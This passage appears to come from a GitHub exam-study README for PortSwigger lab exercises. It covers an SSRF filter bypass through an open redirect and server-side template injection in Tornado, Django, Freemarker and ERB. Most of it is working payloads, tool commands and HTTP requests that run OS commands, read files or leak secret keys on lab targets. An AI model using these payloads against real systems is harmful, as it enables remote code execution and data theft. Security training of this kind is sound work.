tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSRF Open Redirection\u003c/h3\u003e\u003ca id=\"user-content-ssrf-open-redirection\" class=\"anchor\" aria-label=\"Permalink: SSRF Open Redirection\" href=\"#ssrf-open-redirection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe target make \u003cstrong\u003eGET\u003c/strong\u003e request to the \u003cem\u003e\u003cstrong\u003enext product\u003c/strong\u003e\u003c/em\u003e on the e-commerce site, using a \u003cstrong\u003epath\u003c/strong\u003e parameter. On the stockAPI POST request the value provided in body data is the partial path to internal system. See product page \u003ccode\u003esource code\u003c/code\u003e below.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-open-redirection-code.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-open-redirection-code.png\" alt=\"ssrf-open-redirection-code.png\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003cem\u003e\u003cstrong\u003eidentification\u003c/strong\u003e\u003c/em\u003e of this vulnerability is by testing various paths and observing the input path specified is reflected in the response \u003cstrong\u003eLocation\u003c/strong\u003e header.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-open-edirect-location-reflect.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-open-edirect-location-reflect.png\" alt=\"SSRF Open Redirect Location reflect\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eIn this lab they state the admin interface is at \u003ccode\u003ehttp://192.168.0.12:8080/admin\u003c/code\u003e but in exam use the \u003ccode\u003elocalhost:6566\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"https://TARGET.net/product/nextProduct?currentProductId=1\u0026amp;path=http%3a//192.168.0.12%3a8080/admin\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ehttps://TARGET.net/product/nextProduct?currentProductId=1\u0026amp;path=http%3a//192.168.0.12%3a8080/admin\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eOn the POST stock request, replace the StockAPI value with the partial path, not the absolute URL, from the \u003ccode\u003enextProduct\u003c/code\u003e GET request URL as the value of the \u003ccode\u003estockAPI\u003c/code\u003e parameter.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"stockApi=/product/nextProduct?currentProductId=1\u0026amp;path=http%3a//192.168.0.12%3a8080/admin\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003estockApi=/product/nextProduct?currentProductId=1\u0026amp;path=http%3a//192.168.0.12%3a8080/admin\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eURL-encode payload\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"stockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003estockApi=%2fproduct%2fnextProduct%3fcurrentProductId%3d1%26path%3dhttp%253a%2f%2f192.168.0.12%253a8080%2fadmin\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssrf-open-rerdirect.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssrf-open-rerdirect.png\" alt=\"SSRF Open Redirect\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection\" rel=\"nofollow\"\u003ePortSwigger Lab: SSRF with filter bypass via open redirection vulnerability\u003c/a\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch2 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSTI - Server Side Template Injection\u003c/h2\u003e\u003ca id=\"user-content-ssti---server-side-template-injection\" class=\"anchor\" aria-label=\"Permalink: SSTI - Server Side Template Injection\" href=\"#ssti---server-side-template-injection\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"#ssti-identified\"\u003eSSTI Identified\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#tornado\"\u003eTornado\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#django\"\u003eDjango\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#freemarker\"\u003eFreemarker\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#erb\"\u003eERB\u003c/a\u003e\u003cbr\u003e\n\u003ca href=\"#handlebars\"\u003eHandlebars\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eUse the web framework native template syntax to inject a malicious payload into a \u003cstrong\u003e{{input}}\u003c/strong\u003e, which is then executed server-side. Submitting invalid syntax will often result in error message that lead to \u003cem\u003e\u003cstrong\u003eidentifying\u003c/strong\u003e\u003c/em\u003e the template framework. Use PortSwigger \u003ca href=\"https://portswigger.net/web-security/images/template-decision-tree.png\" rel=\"nofollow\"\u003etemplate decision tree\u003c/a\u003e to aid in \u003cem\u003e\u003cstrong\u003eidentification\u003c/strong\u003e\u003c/em\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eSSTI Identified\u003c/h3\u003e\u003ca id=\"user-content-ssti-identified\" class=\"anchor\" aria-label=\"Permalink: SSTI Identified\" href=\"#ssti-identified\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSSTI can be \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e using the tool \u003ca href=\"https://github.com/vladko312/SSTImap\"\u003eSSTImap\u003c/a\u003e. The limitations of this tool is that the template expression \u003ccode\u003e{{7*7}}\u003c/code\u003e results are sometimes only evaluated by another GET request or calling another function in the application, as the \u003cstrong\u003eoutput\u003c/strong\u003e is not directly reflected or echoed into the response where the template expression was posted.\u003cbr\u003e\nAlternative way to \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e the template framework is to induce error message by injecting malformed user supplied payloads.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://youtu.be/p6ElHfcnlSw\" rel=\"nofollow\"\u003eTib3rius give great SSTI explanation on this PortSwigger Web Academy labs tutorial\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"python /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/?message=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd \u0026quot;cat /home/carlos/secret\u0026quot;\"\u003e\u003cpre\u003epython /opt/SSTImap/sstimap.py --engine erb -u https://TARGET.net/\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003emessage=Unfortunately%20this%20product%20is%20out%20of%20stock --os-cmd \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003ecat /home/carlos/secret\u003cspan class=\"pl-pds\"\u003e\"\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003ePOST request with the data param to test and send payload using SSTImap tool.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-source-shell notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"python /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template?productId=1 --cookie 'session=StolenUserCookie' --method POST --marker fuzzer --data 'csrf=ValidCSRFToken\u0026amp;template=fuzzer\u0026amp;template-action=preview' --engine Freemarker --os-cmd 'cat /home/carlos/secret'\"\u003e\u003cpre\u003epython /opt/SSTImap/sstimap.py -u https://TARGET.net/product/template\u003cspan class=\"pl-k\"\u003e?\u003c/span\u003eproductId=1 --cookie \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003esession=StolenUserCookie\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --method POST --marker fuzzer --data \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ecsrf=ValidCSRFToken\u0026amp;template=fuzzer\u0026amp;template-action=preview\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e --engine Freemarker --os-cmd \u003cspan class=\"pl-s\"\u003e\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003ecat /home/carlos/secret\u003cspan class=\"pl-pds\"\u003e'\u003c/span\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/sstimap.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/sstimap.png\" alt=\"SSTImap Tool\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eSSTI payloads to manually \u003cem\u003e\u003cstrong\u003eidentify\u003c/strong\u003e\u003c/em\u003e vulnerability.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"${{\u0026lt;%[%'\u0026quot;}}%\\.,\n}}{{7*7}} \n\n{{fuzzer}}\n${fuzzer}\n${{fuzzer}}\n\n${7*7}\n\u0026lt;%= 7*7 %\u0026gt;\n${{7*7}}\n#{7*7}\n${foobar}\n\n{% debug %}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e${{\u0026lt;%[%'\"}}%\\.,\n}}{{7*7}} \n\n{{fuzzer}}\n${fuzzer}\n${{fuzzer}}\n\n${7*7}\n\u0026lt;%= 7*7 %\u0026gt;\n${{7*7}}\n#{7*7}\n${foobar}\n\n{% debug %}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eTornado\u003c/h3\u003e\u003ca id=\"user-content-tornado\" class=\"anchor\" aria-label=\"Permalink: Tornado\" href=\"#tornado\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003cem\u003e\u003cstrong\u003eIdentification\u003c/strong\u003e\u003c/em\u003e of tornado template framework after testing injection with \u003ccode\u003e}}{{ 7*7}}\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/identify-ssti.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/identify-ssti.png\" alt=\"Identify SSTI\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eTornado Template can be \u003cem\u003e\u003cstrong\u003eidentified\u003c/strong\u003e\u003c/em\u003e using a \u003ccode\u003e}}{{ 7*7}}\u003c/code\u003e payload that breakout of current expression and evaluate \u003ccode\u003e7*7\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eThe \u003cstrong\u003epreferred name\u003c/strong\u003e functionality in the user account profile page is altered and on blog post comment the output displayed.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"POST /my-account/change-blog-post-author-display HTTP/2\nHost: TARGET.net\nCookie: session=fenXl1hfjQBgGkrcmJoK7D8RU3eHkkCd\n\nblog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003ePOST /my-account/change-blog-post-author-display HTTP/2\nHost: TARGET.net\nCookie: session=fenXl1hfjQBgGkrcmJoK7D8RU3eHkkCd\n\nblog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('cat%20/home/carlos/secret')\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/tornado-template.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/tornado-template.png\" alt=\"Tornado Template\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eData extracted from the output response when reloading the blog comment previously saved by a logged in user after changing their preferred display name.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/ssti-tornado-results.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/ssti-tornado-results.png\" alt=\"ssti tornado results\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context\" rel=\"nofollow\"\u003eLab: Basic server-side template injection code context\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eDjango\u003c/h3\u003e\u003ca id=\"user-content-django\" class=\"anchor\" aria-label=\"Permalink: Django\" href=\"#django\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eDjango Template uses \u003ccode\u003edebug\u003c/code\u003e tag to display debugging information.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"${{\u0026lt;%[%'\u0026quot;}}%\\,\n{% debug %} \n{{settings.SECRET_KEY}}\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e${{\u0026lt;%[%'\"}}%\\,\n{% debug %} \n{{settings.SECRET_KEY}}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/django-template.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/django-template.png\" alt=\"Django template\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects\" rel=\"nofollow\"\u003ePortSwigger Lab: Server-side template injection with information disclosure via user-supplied objects\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eFreemarker\u003c/h3\u003e\u003ca id=\"user-content-freemarker\" class=\"anchor\" aria-label=\"Permalink: Freemarker\" href=\"#freemarker\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eFreemarker Template Content-Manager (C0nt3ntM4n4g3r)\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"${foobar}\n\u0026lt;#assign ex=\u0026quot;freemarker.template.utility.Execute\u0026quot;?new()\u0026gt; ${ ex(\u0026quot;cat /home/carlos/secret\u0026quot;) }\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003e${foobar}\n\u0026lt;#assign ex=\"freemarker.template.utility.Execute\"?new()\u0026gt; ${ ex(\"cat /home/carlos/secret\") }\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/freemarker-template.png\"\u003e\u003cimg src=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/raw/main/images/freemarker-template.png\" alt=\"Freemarker template\" style=\"max-width: 100%;\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cp dir=\"auto\"\u003e\u003ca href=\"https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation\" rel=\"nofollow\"\u003ePortSwigger Lab: Server-side template injection using documentation\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"markdown-heading\" dir=\"auto\"\u003e\u003ch3 tabindex=\"-1\" class=\"heading-element\" dir=\"auto\"\u003eERB\u003c/h3\u003e\u003ca id=\"user-content-erb\" class=\"anchor\" aria-label=\"Permalink: ERB\" href=\"#erb\"\u003e\u003csvg class=\"octicon octicon-link\" viewBox=\"0 0 16 16\" version=\"1.1\" width=\"16\" height=\"16\" aria-hidden=\"true\"\u003e\u003cpath d=\"m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eEmbedded Ruby (ERB) template syntax\u003cbr\u003e\nIdentify ERB template in a \u003ccode\u003eGET /?message=Unfortunately%20this%20product%20is%20out%20of%20stock HTTP/2\u003c/code\u003e request that then reflects the message value in the response, \u003ccode\u003eUnfortunately this product is out of stock\u003c/code\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"snippet-clipboard-content notranslate position-relative overflow-auto\" data-snippet-clipboard-copy-content=\"fuzzer${{\u0026lt;%[%'\u0026quot;}}%\\\u0026lt;\u0026gt;\n\u0026lt;%= 7*7 %\u0026gt;\"\u003e\u003cpre class=\"notranslate\"\u003e\u003ccode\u003efuzzer${{\u0026lt;%[%'\"}}%\\\u0026lt;\u0026gt;\n\u0026lt;%= 7*7 %\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cblockquote\u003e\n\u003cp dir=\"auto\"\u003eERB Template documentation reveals that you can list all directories and then read arbitrary files as follows:\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cdiv class=\"highlight highlight-text-html-erb notranslate position-relative overflow-auto\" dir=\"auto\" data-snippet-clipboard-copy-content=\"\u0026lt;%= Dir.entries('/') %\u0026gt;\n\u0026lt;%= File.open('/example/arbitrary-file').read %\u0026gt;\n\n\u0026lt;%= system(\u0026quot;cat /home/carlos/secret\u0026quot;) %\u0026gt;\"\u003e\u003cpre\u003e\u003cspan class=\"pl-k\"\u003e\u0026lt;%=\u003c/span\u003e Dir.entries('/') \u003cspan class=\"pl-k\"\u003e%\u0026gt;\u003c/span\u003e\n\u003cspan class=\"pl-k\"\u003e\u0026lt;%=\u003c/span\u003e File.open('/example/arbitrary-file').read \u003cspan class=\"pl-k\"\u003e%\u0026gt;\u003c/span\u003e\n\n\u003cspan class=\"pl-k\"\u003e\u0026lt;%=\u003c/span\u003e system(\"cat /home/carlos/secret\") \u003cspan class=\"pl-k\"\u003e%\u0026gt;\u003c/span\u003e\u003cspan class=\"pl-v\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-en\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-v\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-en\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-en\"\u003e\u003c/span\u003e\u003cspan class=\"pl-en\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003cspan class=\"pl-s\"\u003e\u003c/span\u003e\u003cspan class=\"pl-kos\"\u003e\u003c/span\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp dir=\"auto\"\u003e\u003ca target=\"_blank\" rel=\"noopener noreferrer\" href=\"/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/blob/main/images/erb-template.png\"\u003e\u003cimg 